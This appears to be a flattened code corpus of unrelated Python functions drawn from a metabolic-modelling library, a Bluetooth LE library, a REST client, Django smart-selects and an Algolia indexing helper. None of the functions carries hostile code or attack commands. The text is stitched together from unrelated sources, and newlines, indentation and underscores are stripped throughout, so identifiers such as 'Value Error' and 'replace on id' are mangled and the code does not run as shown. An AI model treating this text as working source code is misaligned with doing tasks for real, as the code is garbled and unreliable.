def replace on id ( self , new object ) : the id = new object . id the index = self . dict [ the id ] list . setitem ( self , the index , new object )
def append ( self , object ) : the id = object . id self . check ( the id ) self . dict [ the id ] = len ( self ) list . append ( self , object )
def union ( self , iterable ) : dict = self . dict append = self . append for i in iterable : if i . id not in dict : append ( i )
def extend ( self , iterable ) : # Sometimes during initialization from an older pickle,  dict # will not have initialized yet, because the initialization class was # left unspecified. This is an issue because unpickling calls # Dict List.extend, which requires the presence of  dict. Therefore, # the issue is caught and addressed here. if not hasattr ( self , " dict" ) or self . dict is None : self . dict = { } dict = self . dict current length = len ( self ) list . extend ( self , iterable ) for i , obj in enumerate ( islice ( self , current length , None ) , current length ) : the id = obj . id if the id not in dict : dict [ the id ] = i else : # undo the extend and raise an error self = self [ : current length ] self . check ( the id ) # if the above succeeded, then the id must be present # twice in the list being added raise Value Error ( "id '%s' at index %d is non-unique. " "Is it present twice?" % ( str ( the id ) , i ) )
def insert ( self , index , object ) : self . check ( object . id ) list . insert ( self , index , object ) # all subsequent entries now have been shifted up by 1 dict = self . dict for i , j in iteritems ( dict ) : if j >= index : dict [ i ] = j + 1 dict [ object . id ] = index
def check solver status ( status , raise error = False ) : if status == OPTIMAL : return elif ( status in has primals ) and not raise error : warn ( "solver status is '{}'" . format ( status ) , User Warning ) elif status is None : raise Optimization Error ( "model was not optimized yet or solver context switched" ) else : raise Optimization Error ( "solver status is '{}'" . format ( status ) )
def step ( sampler , x , delta , fraction = None , tries = 0 ) : prob = sampler . problem valid = ( ( np . abs ( delta ) > sampler . feasibility tol ) & np . logical not ( prob . variable fixed ) ) # permissible alphas for staying in variable bounds valphas = ( ( 1.0 - sampler . bounds tol ) * prob . variable bounds - x ) [ : , valid ] valphas = ( valphas / delta [ valid ] ) . flatten ( ) if prob . bounds . shape [ 0 ] > 0 : # permissible alphas for staying in constraint bounds ineqs = prob . inequalities . dot ( delta ) valid = np . abs ( ineqs ) > sampler . feasibility tol balphas = ( ( 1.0 - sampler . bounds tol ) * prob . bounds - prob . inequalities . dot ( x ) ) [ : , valid ] balphas = ( balphas / ineqs [ valid ] ) . flatten ( ) # combined alphas alphas = np . hstack ( [ valphas , balphas ] ) else : alphas = valphas pos alphas = alphas [ alphas > 0.0 ] neg alphas = alphas [ alphas <= 0.0 ] alpha range = np . array ( [ neg alphas . max ( ) if len ( neg alphas ) > 0 else 0 , pos alphas . min ( ) if len ( pos alphas ) > 0 else 0 ] ) if fraction : alpha = alpha range [ 0 ] + fraction * ( alpha range [ 1 ] - alpha range [ 0 ] ) else : alpha = np . random . uniform ( alpha range [ 0 ] , alpha range [ 1 ] ) p = x + alpha * delta # Numerical instabilities may cause bounds invalidation # reset sampler and sample from one of the original warmup directions # if that occurs. Also reset if we got stuck. if ( np . any ( sampler . bounds dist ( p ) < - sampler . bounds tol ) or np . abs ( np . abs ( alpha range ) . max ( ) * delta ) . max ( ) < sampler . bounds tol ) : if tries > MAX TRIES : raise Runtime Error ( "Can not escape sampling region, model seems" " numerically unstable :( Reporting the " "model to " "will help us to fix this :)" ) LOGGER . info ( "found bounds infeasibility in sample, " "resetting to center" ) newdir = sampler . warmup [ np . random . randint ( sampler . n warmup ) ] sampler . retries += 1 return step ( sampler , sampler . center , newdir - sampler . center , None , tries + 1 ) return p
def build problem ( self ) : # Set up the mathematical problem prob = constraint matrices ( self . model , zero tol = self . feasibility tol ) # check if there any non-zero equality constraints equalities = prob . equalities b = prob . b bounds = np . atleast 2d ( prob . bounds ) . T var bounds = np . atleast 2d ( prob . variable bounds ) . T homogeneous = all ( np . abs ( b ) < self . feasibility tol ) fixed non zero = np . abs ( prob . variable bounds [ : , 1 ] ) > self . feasibility tol fixed non zero &= prob . variable fixed # check if there are any non-zero fixed variables, add them as # equalities to the stoichiometric matrix if any ( fixed non zero ) : n fixed = fixed non zero . sum ( ) rows = np . zeros ( ( n fixed , prob . equalities . shape [ 1 ] ) ) rows [ range ( n fixed ) , np . where ( fixed non zero ) ] = 1.0 equalities = np . vstack ( [ equalities , rows ] ) var b = prob . variable bounds [ : , 1 ] b = np . hstack ( [ b , var b [ fixed non zero ] ] ) homogeneous = False # Set up a projection that can cast point into the nullspace nulls = nullspace ( equalities ) # convert bounds to a matrix and add variable bounds as well return Problem ( equalities = shared np array ( equalities . shape , equalities ) , b = shared np array ( b . shape , b ) , inequalities = shared np array ( prob . inequalities . shape , prob . inequalities ) , bounds = shared np array ( bounds . shape , bounds ) , variable fixed = shared np array ( prob . variable fixed . shape , prob . variable fixed , integer = True ) , variable bounds = shared np array ( var bounds . shape , var bounds ) , nullspace = shared np array ( nulls . shape , nulls ) , homogeneous = homogeneous )
def random point ( self ) : idx = np . random . randint ( self . n warmup , size = min ( 2 , np . ceil ( np . sqrt ( self . n warmup ) ) ) ) return self . warmup [ idx , : ] . mean ( axis = 0 )
def is redundant ( self , matrix , cutoff = None ) : cutoff = 1.0 - self . feasibility tol # Avoid zero variances extra col = matrix [ : , 0 ] + 1 # Avoid zero rows being correlated with constant rows extra col [ matrix . sum ( axis = 1 ) == 0 ] = 2 corr = np . corrcoef ( np . c [ matrix , extra col ] ) corr = np . tril ( corr , - 1 ) return ( np . abs ( corr ) > cutoff ) . any ( axis = 1 )
def bounds dist ( self , p ) : prob = self . problem lb dist = ( p - prob . variable bounds [ 0 , ] ) . min ( ) ub dist = ( prob . variable bounds [ 1 , ] - p ) . min ( ) if prob . bounds . shape [ 0 ] > 0 : const = prob . inequalities . dot ( p ) const lb dist = ( const - prob . bounds [ 0 , ] ) . min ( ) const ub dist = ( prob . bounds [ 1 , ] - const ) . min ( ) lb dist = min ( lb dist , const lb dist ) ub dist = min ( ub dist , const ub dist ) return np . array ( [ lb dist , ub dist ] )
def add switches and objective ( self ) : constraints = list ( ) big m = max ( max ( abs ( b ) for b in r . bounds ) for r in self . model . reactions ) prob = self . model . problem for rxn in self . model . reactions : if not hasattr ( rxn , 'gapfilling type' ) : continue indicator = prob . Variable ( name = 'indicator {}' . format ( rxn . id ) , lb = 0 , ub = 1 , type = 'binary' ) if rxn . id in self . penalties : indicator . cost = self . penalties [ rxn . id ] else : indicator . cost = self . penalties [ rxn . gapfilling type ] indicator . rxn id = rxn . id self . indicators . append ( indicator ) # if z = 1 v i is allowed non-zero # v i - Mz <= 0   and   v i + Mz >= 0 constraint lb = prob . Constraint ( rxn . flux expression - big m * indicator , ub = 0 , name = 'constraint lb {}' . format ( rxn . id ) , sloppy = True ) constraint ub = prob . Constraint ( rxn . flux expression + big m * indicator , lb = 0 , name = 'constraint ub {}' . format ( rxn . id ) , sloppy = True ) constraints . extend ( [ constraint lb , constraint ub ] ) self . model . add cons vars ( self . indicators ) self . model . add cons vars ( constraints , sloppy = True ) self . model . objective = prob . Objective ( Zero , direction = 'min' , sloppy = True ) self . model . objective . set linear coefficients ( { i : 1 for i in self . indicators } ) self . update costs ( )
def normalize cutoff ( model , zero cutoff = None ) : if zero cutoff is None : return model . tolerance else : if zero cutoff < model . tolerance : raise Value Error ( "The chosen zero cutoff cannot be less than the model's " "tolerance value." ) else : return zero cutoff
def fix type ( value ) : # Because numpy floats can not be pickled to json if isinstance ( value , string types ) : return str ( value ) if isinstance ( value , float ) : return float ( value ) if isinstance ( value , bool ) : return bool ( value ) if isinstance ( value , set ) : return list ( value ) if isinstance ( value , dict ) : return Ordered Dict ( ( key , value [ key ] ) for key in sorted ( value ) ) # handle legacy Formula type if value . class . name == "Formula" : return str ( value ) if value is None : return "" return value
def update optional ( cobra object , new dict , optional attribute dict , ordered keys ) : for key in ordered keys : default = optional attribute dict [ key ] value = getattr ( cobra object , key ) if value is None or value == default : continue new dict [ key ] = fix type ( value )
def get id compartment ( id ) : bracket search = bracket re . findall ( id ) if len ( bracket search ) == 1 : return bracket search [ 0 ] [ 1 ] underscore search = underscore re . findall ( id ) if len ( underscore search ) == 1 : return underscore search [ 0 ] [ 1 ] return None
def cell ( x ) : x no none = [ i if i is not None else "" for i in x ] return array ( x no none , dtype = np object )
def create mat dict ( model ) : rxns = model . reactions mets = model . metabolites mat = Ordered Dict ( ) mat [ "mets" ] = cell ( [ met id for met id in create mat metabolite id ( model ) ] ) mat [ "met Names" ] = cell ( mets . list attr ( "name" ) ) mat [ "met Formulas" ] = cell ( [ str ( m . formula ) for m in mets ] ) try : mat [ "met Charge" ] = array ( mets . list attr ( "charge" ) ) * 1. except Type Error : # can't have any None entries for charge, or this will fail pass mat [ "genes" ] = cell ( model . genes . list attr ( "id" ) ) # make a matrix for rxn Gene Mat # reactions are rows, genes are columns rxn gene = scipy sparse . dok matrix ( ( len ( model . reactions ) , len ( model . genes ) ) ) if min ( rxn gene . shape ) > 0 : for i , reaction in enumerate ( model . reactions ) : for gene in reaction . genes : rxn gene [ i , model . genes . index ( gene ) ] = 1 mat [ "rxn Gene Mat" ] = rxn gene mat [ "gr Rules" ] = cell ( rxns . list attr ( "gene reaction rule" ) ) mat [ "rxns" ] = cell ( rxns . list attr ( "id" ) ) mat [ "rxn Names" ] = cell ( rxns . list attr ( "name" ) ) mat [ "sub Systems" ] = cell ( rxns . list attr ( "subsystem" ) ) stoich mat = create stoichiometric matrix ( model ) mat [ "S" ] = stoich mat if stoich mat is not None else [ [ ] ] # multiply by 1 to convert to float, working around scipy bug mat [ "lb" ] = array ( rxns . list attr ( "lower bound" ) ) * 1. mat [ "ub" ] = array ( rxns . list attr ( "upper bound" ) ) * 1. mat [ "b" ] = array ( mets . list attr ( " bound" ) ) * 1. mat [ "c" ] = array ( rxns . list attr ( "objective coefficient" ) ) * 1. mat [ "rev" ] = array ( rxns . list attr ( "reversibility" ) ) * 1 mat [ "description" ] = str ( model . id ) return mat
def get context ( obj ) : try : return obj . contexts [ - 1 ] except ( Attribute Error , Index Error ) : pass try : return obj . model . contexts [ - 1 ] except ( Attribute Error , Index Error ) : pass return None
def get metabolite compartments ( self ) : warn ( 'use Model.compartments instead' , Deprecation Warning ) return { met . compartment for met in self . metabolites if met . compartment is not None }
def escape str id ( id str ) : for c in ( "'" , '"' ) : if id str . startswith ( c ) and id str . endswith ( c ) and id str . count ( c ) == 2 : id str = id str . strip ( c ) for char , escaped char in renames : id str = id str . replace ( char , escaped char ) return id str
def escape ID ( cobra model ) : for x in chain ( [ cobra model ] , cobra model . metabolites , cobra model . reactions , cobra model . genes ) : x . id = escape str id ( x . id ) cobra model . repair ( ) gene renamer = Gene Escaper ( ) for rxn , rule in iteritems ( get compiled gene reaction rules ( cobra model ) ) : if rule is not None : rxn . gene reaction rule = ast2str ( gene renamer . visit ( rule ) )
def rename genes ( cobra model , rename dict ) : recompute reactions = set ( ) # need to recomptue related genes remove genes = [ ] for old name , new name in iteritems ( rename dict ) : # undefined if there a value matches a different key # because dict is unordered try : gene index = cobra model . genes . index ( old name ) except Value Error : gene index = None old gene present = gene index is not None new gene present = new name in cobra model . genes if old gene present and new gene present : old gene = cobra model . genes . get by id ( old name ) # Added in case not renaming some genes: if old gene is not cobra model . genes . get by id ( new name ) : remove genes . append ( old gene ) recompute reactions . update ( old gene . reaction ) elif old gene present and not new gene present : # rename old gene to new gene gene = cobra model . genes [ gene index ] # trick Dict List into updating index cobra model . genes . dict . pop ( gene . id ) # ugh gene . id = new name cobra model . genes [ gene index ] = gene elif not old gene present and new gene present : pass else : # if not old gene present and not new gene present # the new gene's  model will be set by repair # This would add genes from rename dict # that are not associated with a rxn # cobra model.genes.append(Gene(new name)) pass cobra model . repair ( ) class Renamer ( Node Transformer ) : def visit Name ( self , node ) : node . id = rename dict . get ( node . id , node . id ) return node gene renamer = Renamer ( ) for rxn , rule in iteritems ( get compiled gene reaction rules ( cobra model ) ) : if rule is not None : rxn . gene reaction rule = ast2str ( gene renamer . visit ( rule ) ) for rxn in recompute reactions : rxn . gene reaction rule = rxn . gene reaction rule for i in remove genes : cobra model . genes . remove ( i )
def init worker ( model , loopless , sense ) : global model global loopless model = model model . solver . objective . direction = sense loopless = loopless
def find bump ( target , tag ) : tmp = tag . split ( "." ) existing = [ intify ( basename ( f ) ) for f in glob ( join ( target , "[0-9]*.md" ) ) ] latest = max ( existing ) if int ( tmp [ 0 ] ) > latest [ 0 ] : return "major" elif int ( tmp [ 1 ] ) > latest [ 1 ] : return "minor" else : return "patch"
def reverse id ( self ) : return ' ' . join ( ( self . id , 'reverse' , hashlib . md5 ( self . id . encode ( 'utf-8' ) ) . hexdigest ( ) [ 0 : 5 ] ) )
def build reaction string ( self , use metabolite names = False ) : def format ( number ) : return "" if number == 1 else str ( number ) . rstrip ( "." ) + " " id type = 'id' if use metabolite names : id type = 'name' reactant bits = [ ] product bits = [ ] for met in sorted ( self . metabolites , key = attrgetter ( "id" ) ) : coefficient = self . metabolites [ met ] name = str ( getattr ( met , id type ) ) if coefficient >= 0 : product bits . append ( format ( coefficient ) + name ) else : reactant bits . append ( format ( abs ( coefficient ) ) + name ) reaction string = ' + ' . join ( reactant bits ) if not self . reversibility : if self . lower bound < 0 and self . upper bound <= 0 : reaction string += ' <-- ' else : reaction string += ' --> ' else : reaction string += ' <=> ' reaction string += ' + ' . join ( product bits ) return reaction string
def compartments ( self ) : if self . compartments is None : self . compartments = { met . compartment for met in self . metabolites if met . compartment is not None } return self . compartments
def clip ( sid , prefix ) : return sid [ len ( prefix ) : ] if sid . startswith ( prefix ) else sid
def f gene ( sid , prefix = "G " ) : sid = sid . replace ( SBML DOT , "." ) return clip ( sid , prefix )
def create parameter ( model , pid , value , sbo = None , constant = True , units = None , flux udef = None ) : parameter = model . create Parameter ( ) # type: libsbml.Parameter parameter . set Id ( pid ) parameter . set Value ( value ) parameter . set Constant ( constant ) if sbo : parameter . set SBO Term ( sbo ) if units : parameter . set Units ( flux udef . get Id ( ) )
def reaction weight ( reaction ) : if len ( reaction . metabolites ) != 1 : raise Value Error ( 'Reaction weight is only defined for single ' 'metabolite products or educts.' ) met , coeff = next ( iteritems ( reaction . metabolites ) ) return [ coeff * met . formula weight ]
def add cycle free ( model , fluxes ) : model . objective = model . solver . interface . Objective ( Zero , direction = "min" , sloppy = True ) objective vars = [ ] for rxn in model . reactions : flux = fluxes [ rxn . id ] if rxn . boundary : rxn . bounds = ( flux , flux ) continue if flux >= 0 : rxn . bounds = max ( 0 , rxn . lower bound ) , max ( flux , rxn . upper bound ) objective vars . append ( rxn . forward variable ) else : rxn . bounds = min ( flux , rxn . lower bound ) , min ( 0 , rxn . upper bound ) objective vars . append ( rxn . reverse variable ) model . objective . set linear coefficients ( { v : 1.0 for v in objective vars } )
def hashable bytes ( data ) : if isinstance ( data , bytes ) : return data elif isinstance ( data , str ) : return data . encode ( 'ascii' ) # Fail on anything non-ASCII. else : raise Type Error ( data )
def update advertised ( self , advertised ) : # Advertisement data was received, pull out advertised service UUI Ds and # name from advertisement data. if 'k CB Adv Data Service UUI Ds' in advertised : self . advertised = self . advertised + map ( cbuuid to uuid , advertised [ 'k CB Adv Data Service UUI Ds' ] )
def characteristics discovered ( self , service ) : # Characteristics for the specified service were discovered.  Update # set of discovered services and signal when all have been discovered. self . discovered services . add ( service ) if self . discovered services >= set ( self . peripheral . services ( ) ) : # Found all the services characteristics, finally time to fire the # service discovery complete event. self . discovered . set ( )
def characteristic changed ( self , characteristic ) : # Called when a characteristic is changed.  Get the on changed handler # for this characteristic (if it exists) and call it. on changed = self . char on changed . get ( characteristic , None ) if on changed is not None : on changed ( characteristic . value ( ) . bytes ( ) . tobytes ( ) ) # Also tell the characteristic that it has a new value. # First get the service that is associated with this characteristic. char = characteristic list ( ) . get ( characteristic ) if char is not None : char . value read . set ( )
def descriptor changed ( self , descriptor ) : # Tell the descriptor it has a new value to read. desc = descriptor list ( ) . get ( descriptor ) if desc is not None : desc . value read . set ( )
def rssi ( self , timeout sec = TIMEOUT SEC ) : # Kick off query to get RSSI, then wait for it to return asyncronously # when the  rssi changed() function is called. self . rssi read . clear ( ) self . peripheral . read RSSI ( ) if not self . rssi read . wait ( timeout sec ) : raise Runtime Error ( 'Exceeded timeout waiting for RSSI value!' ) return self . rssi
def state changed ( self , state ) : logger . debug ( 'Adapter state change: {0}' . format ( state ) ) # Handle when powered on. if state == 5 : self . powered off . clear ( ) self . powered on . set ( ) # Handle when powered off. elif state == 4 : self . powered on . clear ( ) self . powered off . set ( )
def start scan ( self , timeout sec = TIMEOUT SEC ) : get provider ( ) . central manager . scan For Peripherals With Services options ( None , None ) self . is scanning = True
def stop scan ( self , timeout sec = TIMEOUT SEC ) : get provider ( ) . central manager . stop Scan ( ) self . is scanning = False
def power on ( self , timeout sec = TIMEOUT SEC ) : # Turn on bluetooth and wait for powered on event to be set. self . powered on . clear ( ) IO Bluetooth Preference Set Controller Power State ( 1 ) if not self . powered on . wait ( timeout sec ) : raise Runtime Error ( 'Exceeded timeout waiting for adapter to power on!' )
def power off ( self , timeout sec = TIMEOUT SEC ) : # Turn off bluetooth. self . powered off . clear ( ) IO Bluetooth Preference Set Controller Power State ( 0 ) if not self . powered off . wait ( timeout sec ) : raise Runtime Error ( 'Exceeded timeout waiting for adapter to power off!' )
def read value ( self , timeout sec = TIMEOUT SEC ) : # Kick off a query to read the value of the characteristic, then wait # for the result to return asyncronously. self . value read . clear ( ) self . device . peripheral . read Value For Characteristic ( self . characteristic ) if not self . value read . wait ( timeout sec ) : raise Runtime Error ( 'Exceeded timeout waiting to read characteristic value!' ) return self . characteristic . value ( )
def write value ( self , value , write type = 0 ) : data = NS Data . data With Bytes length ( value , len ( value ) ) self . device . peripheral . write Value for Characteristic type ( data , self . characteristic , write type )
def read value ( self ) : pass # Kick off a query to read the value of the descriptor, then wait # for the result to return asyncronously. self . value read . clear ( ) self . device . peripheral . read Value For Descriptor ( self . descriptor ) if not self . value read . wait ( timeout sec ) : raise Runtime Error ( 'Exceeded timeout waiting to read characteristic value!' ) return self . value
def start scan ( self , timeout sec = TIMEOUT SEC ) : self . scan started . clear ( ) self . adapter . Start Discovery ( ) if not self . scan started . wait ( timeout sec ) : raise Runtime Error ( 'Exceeded timeout waiting for adapter to start scanning!' )
def stop scan ( self , timeout sec = TIMEOUT SEC ) : self . scan stopped . clear ( ) self . adapter . Stop Discovery ( ) if not self . scan stopped . wait ( timeout sec ) : raise Runtime Error ( 'Exceeded timeout waiting for adapter to stop scanning!' )
def central Manager did Connect Peripheral ( self , manager , peripheral ) : logger . debug ( 'central Manager did Connect Peripheral called' ) # Setup peripheral delegate and kick off service discovery.  For now just # assume all services need to be discovered. peripheral . set Delegate ( self ) peripheral . discover Services ( None ) # Fire connected event for device. device = device list ( ) . get ( peripheral ) if device is not None : device . set connected ( )
def central Manager did Disconnect Peripheral error ( self , manager , peripheral , error ) : logger . debug ( 'central Manager did Disconnect Peripheral called' ) # Get the device and remove it from the device list, then fire its # disconnected event. device = device list ( ) . get ( peripheral ) if device is not None : # Fire disconnected event and remove device from device list. device . set disconnected ( ) device list ( ) . remove ( peripheral )
def peripheral did Discover Services ( self , peripheral , services ) : logger . debug ( 'peripheral did Discover Services called' ) # Make sure the discovered services are added to the list of known # services, and kick off characteristic discovery for each one. # NOTE: For some reason the services parameter is never set to a good # value, instead you must query peripheral.services() to enumerate the # discovered services. for service in peripheral . services ( ) : if service list ( ) . get ( service ) is None : service list ( ) . add ( service , Core Bluetooth Gatt Service ( service ) ) # Kick off characteristic discovery for this service.  Just discover # all characteristics for now. peripheral . discover Characteristics for Service ( None , service )
def peripheral did Discover Characteristics For Service error ( self , peripheral , service , error ) : logger . debug ( 'peripheral did Discover Characteristics For Service error called' ) # Stop if there was some kind of error. if error is not None : return # Make sure the discovered characteristics are added to the list of known # characteristics, and kick off descriptor discovery for each char. for char in service . characteristics ( ) : # Add to list of known characteristics. if characteristic list ( ) . get ( char ) is None : characteristic list ( ) . add ( char , Core Bluetooth Gatt Characteristic ( char ) ) # Start descriptor discovery. peripheral . discover Descriptors For Characteristic ( char ) # Notify the device about the discovered characteristics. device = device list ( ) . get ( peripheral ) if device is not None : device . characteristics discovered ( service )
def peripheral did Discover Descriptors For Characteristic error ( self , peripheral , characteristic , error ) : logger . debug ( 'peripheral did Discover Descriptors For Characteristic error called' ) # Stop if there was some kind of error. if error is not None : return # Make sure the discovered descriptors are added to the list of known # descriptors. for desc in characteristic . descriptors ( ) : # Add to list of known descriptors. if descriptor list ( ) . get ( desc ) is None : descriptor list ( ) . add ( desc , Core Bluetooth Gatt Descriptor ( desc ) )
def peripheral did Update Value For Characteristic error ( self , peripheral , characteristic , error ) : logger . debug ( 'peripheral did Update Value For Characteristic error called' ) # Stop if there was some kind of error. if error is not None : return # Notify the device about the updated characteristic value. device = device list ( ) . get ( peripheral ) if device is not None : device . characteristic changed ( characteristic )
def peripheral did Update Value For Descriptor error ( self , peripheral , descriptor , error ) : logger . debug ( 'peripheral did Update Value For Descriptor error called' ) # Stop if there was some kind of error. if error is not None : return # Notify the device about the updated descriptor value. device = device list ( ) . get ( peripheral ) if device is not None : device . descriptor changed ( descriptor )
def peripheral did Read RSSI error ( self , peripheral , rssi , error ) : logger . debug ( 'peripheral did Read RSSI error called' ) # Note this appears to be completely undocumented at the time of this # writing.  Can see more details at: #  http://stackoverflow.com/questions/25952218/ios-8-corebluetooth-deprecated-rssi-methods # Stop if there was some kind of error. if error is not None : return # Notify the device about the updated RSSI value. device = device list ( ) . get ( peripheral ) if device is not None : device . rssi changed ( rssi )
def user thread main ( self , target ) : try : # Run user's code. return code = target ( ) # Assume good result (0 return code) if none is returned. if return code is None : return code = 0 # Call exit on the main thread when user code has finished. App Helper . call After ( lambda : sys . exit ( return code ) ) except Exception as ex : # Something went wrong.  Raise the exception on the main thread to exit. App Helper . call After ( self . raise error , sys . exc info ( ) )
def user thread main ( self , target ) : try : # Wait for G Lib main loop to start running before starting user code. while True : if self . gobject mainloop is not None and self . gobject mainloop . is running ( ) : # Main loop is running, we should be ready to make bluez D Bus calls. break # Main loop isn't running yet, give time back to other threads. time . sleep ( 0 ) # Run user's code. self . return code = target ( ) # Assume good result (0 return code) if none is returned. if self . return code is None : self . return code = 0 # Signal the main loop to exit. self . gobject mainloop . quit ( ) except Exception as ex : # Something went wrong.  Raise the exception on the main thread to # exit. self . exception = sys . exc info ( ) self . gobject mainloop . quit ( )
def get objects by path ( self , paths ) : return map ( lambda x : self . bus . get object ( 'org.bluez' , x ) , paths )
def print tree ( self ) : # This is based on the bluez sample code get-managed-objects.py. objects = self . bluez . Get Managed Objects ( ) for path in objects . keys ( ) : print ( "[ %s ]" % ( path ) ) interfaces = objects [ path ] for interface in interfaces . keys ( ) : if interface in [ "org.freedesktop.D Bus.Introspectable" , "org.freedesktop.D Bus.Properties" ] : continue print ( "    %s" % ( interface ) ) properties = interfaces [ interface ] for key in properties . keys ( ) : print ( "      %s = %s" % ( key , properties [ key ] ) )
def remove ( self , cbobject ) : with self . lock : if cbobject in self . metadata : del self . metadata [ cbobject ]
def cbuuid to uuid ( cbuuid ) : data = cbuuid . data ( ) . bytes ( ) template = '{:0>8}-0000-1000-8000-00805f9b34fb' if len ( data ) <= 4 else '{:0>32}' value = template . format ( hexlify ( data . tobytes ( ) [ : 16 ] ) . decode ( 'ascii' ) ) return uuid . UUID ( hex = value )
def set color ( self , r , g , b ) : # See more details on the bulb's protocol from this guide: #   https://learn.adafruit.com/reverse-engineering-a-bluetooth-low-energy-light-bulb/overview command = '\x58\x01\x03\x01\x FF\x00{0}{1}{2}' . format ( chr ( r & 0x FF ) , chr ( g & 0x FF ) , chr ( b & 0x FF ) ) self . color . write value ( command )
def get provider ( ) : global provider # Set the provider based on the current platform. if provider is None : if sys . platform . startswith ( 'linux' ) : # Linux platform from . bluez dbus . provider import Bluez Provider provider = Bluez Provider ( ) elif sys . platform == 'darwin' : # Mac OSX platform from . corebluetooth . provider import Core Bluetooth Provider provider = Core Bluetooth Provider ( ) else : # Unsupported platform raise Runtime Error ( 'Sorry the {0} platform is not supported by the BLE library!' . format ( sys . platform ) ) return provider
def to Big Int ( byte Array ) : array = byte Array [ : : - 1 ] # reverse array out = 0 for key , value in enumerate ( array ) : decoded = struct . unpack ( "B" , bytes ( [ value ] ) ) [ 0 ] out = out | decoded << key * 8 return out
def get ( self , url , name , params = None , headers = None , connection = None ) : if name is None : name = '' params = params or { } headers = headers or { } endpoint = self . build endpoint url ( url , name ) self . authenticate ( params , headers ) return make get request ( endpoint , params , headers , connection = connection )
def get async ( self , url , name , callback = None , params = None , headers = None ) : if name is None : name = '' params = params or { } headers = headers or { } endpoint = self . build endpoint url ( url , name ) self . authenticate ( params , headers ) process pool . apply async ( make get request , args = ( endpoint , params , headers ) , callback = callback )
def put async ( self , url , name , data , callback = None , params = None , headers = None ) : if name is None : name = '' params = params or { } headers = headers or { } endpoint = self . build endpoint url ( url , name ) self . authenticate ( params , headers ) data = json . dumps ( data , cls = JSON Encoder ) process pool . apply async ( make put request , args = ( endpoint , data , params , headers ) , callback = callback )
def post ( self , url , data , params = None , headers = None , connection = None ) : params = params or { } headers = headers or { } endpoint = self . build endpoint url ( url , None ) self . authenticate ( params , headers ) data = json . dumps ( data , cls = JSON Encoder ) return make post request ( endpoint , data , params , headers , connection = connection )
def post async ( self , url , data , callback = None , params = None , headers = None ) : params = params or { } headers = headers or { } endpoint = self . build endpoint url ( url , None ) self . authenticate ( params , headers ) data = json . dumps ( data , cls = JSON Encoder ) process pool . apply async ( make post request , args = ( endpoint , data , params , headers ) , callback = callback )
def patch ( self , url , data , params = None , headers = None , connection = None ) : params = params or { } headers = headers or { } endpoint = self . build endpoint url ( url , None ) self . authenticate ( params , headers ) data = json . dumps ( data , cls = JSON Encoder ) return make patch request ( endpoint , data , params , headers , connection = connection )
def delete ( self , url , name , params = None , headers = None , connection = None ) : if not name : name = '' params = params or { } headers = headers or { } endpoint = self . build endpoint url ( url , name ) self . authenticate ( params , headers ) return make delete request ( endpoint , params , headers , connection = connection )
def delete async ( self , url , name , callback = None , params = None , headers = None ) : if not name : name = '' params = params or { } headers = headers or { } endpoint = self . build endpoint url ( url , name ) self . authenticate ( params , headers ) process pool . apply async ( make delete request , args = ( endpoint , params , headers ) , callback = callback )
def filterchain all ( request , app , model , field , foreign key app name , foreign key model name , foreign key field name , value ) : model class = get model ( app , model ) keywords = get keywords ( field , value ) # SECURITY: Make sure all smart selects requests are opt-in foreign model class = get model ( foreign key app name , foreign key model name ) if not any ( [ ( isinstance ( f , Chained Many To Many Field ) or isinstance ( f , Chained Foreign Key ) ) for f in foreign model class . meta . get fields ( ) ] ) : raise Permission Denied ( "Smart select disallowed" ) # filter queryset using limit choices to limit choices to = get limit choices to ( foreign key app name , foreign key model name , foreign key field name ) queryset = get queryset ( model class , limit choices to = limit choices to ) filtered = list ( do filter ( queryset , keywords ) ) # Sort results if model doesn't include a default ordering. if not getattr ( model class . meta , 'ordering' , False ) : sort results ( list ( filtered ) ) excluded = list ( do filter ( queryset , keywords , exclude = True ) ) # Sort results if model doesn't include a default ordering. if not getattr ( model class . meta , 'ordering' , False ) : sort results ( list ( excluded ) ) # Empty choice to separate filtered and excluded results. empty choice = { 'value' : "" , 'display' : "---------" } serialized results = ( serialize results ( filtered ) + [ empty choice ] + serialize results ( excluded ) ) return Json Response ( serialized results , safe = False )
def media ( self ) : media = super ( Jquery Media Mixin , self ) . media js = [ ] if JQUERY URL : js . append ( JQUERY URL ) elif JQUERY URL is not False : vendor = '' if django . VERSION < ( 1 , 9 , 0 ) else 'vendor/jquery/' extra = '' if settings . DEBUG else '.min' jquery paths = [ '{}jquery{}.js' . format ( vendor , extra ) , 'jquery.init.js' , ] if USE DJANGO JQUERY : jquery paths = [ 'admin/js/{}' . format ( path ) for path in jquery paths ] js . extend ( jquery paths ) media += Media ( js = js ) return media
def media ( self ) : media = super ( Chained Select , self ) . media js = [ 'smart-selects/admin/js/chainedfk.js' , 'smart-selects/admin/js/bindfields.js' ] media += Media ( js = js ) return media
def get available choices ( self , queryset , value ) : item = queryset . filter ( pk = value ) . first ( ) if item : try : pk = getattr ( item , self . chained model field + " id" ) filter = { self . chained model field : pk } except Attribute Error : try : # maybe m2m? pks = getattr ( item , self . chained model field ) . all ( ) . values list ( 'pk' , flat = True ) filter = { self . chained model field + " in" : pks } except Attribute Error : try : # maybe a set? pks = getattr ( item , self . chained model field + " set" ) . all ( ) . values list ( 'pk' , flat = True ) filter = { self . chained model field + " in" : pks } except Attribute Error : # give up filter = { } filtered = list ( get model ( self . to app name , self . to model name ) . objects . filter ( * * filter ) . distinct ( ) ) if self . sort : sort results ( filtered ) else : # invalid value for queryset filtered = [ ] return filtered
def media ( self ) : media = super ( Chained Select Multiple , self ) . media js = [ 'smart-selects/admin/js/chainedm2m.js' , 'smart-selects/admin/js/bindfields.js' ] if self . horizontal : # For horizontal mode add django filter horizontal javascript code js . extend ( [ "admin/js/core.js" , "admin/js/Select Box.js" , "admin/js/Select Filter2.js" ] ) media += Media ( js = js ) return media
def should really index ( self , instance ) : if self . should index is method : is method = inspect . ismethod ( self . should index ) try : count args = len ( inspect . signature ( self . should index ) . parameters ) except Attribute Error : # noinspection Py Deprecation count args = len ( inspect . getargspec ( self . should index ) . args ) if is method or count args is 1 : # bound method, call with instance return self . should index ( instance ) else : # unbound method, simply call without arguments return self . should index ( ) else : # property/attribute/Field, evaluate as bool attr type = type ( self . should index ) if attr type is Deferred Attribute : attr value = self . should index . get ( instance , None ) elif attr type is str : attr value = getattr ( instance , self . should index ) elif attr type is property : attr value = self . should index . get ( instance ) else : raise Algolia Index Error ( '{} should be a boolean attribute or a method that returns a boolean.' . format ( self . should index ) ) if type ( attr value ) is not bool : raise Algolia Index Error ( "%s's should index (%s) should be a boolean" % ( instance . class . name , self . should index ) ) return attr value
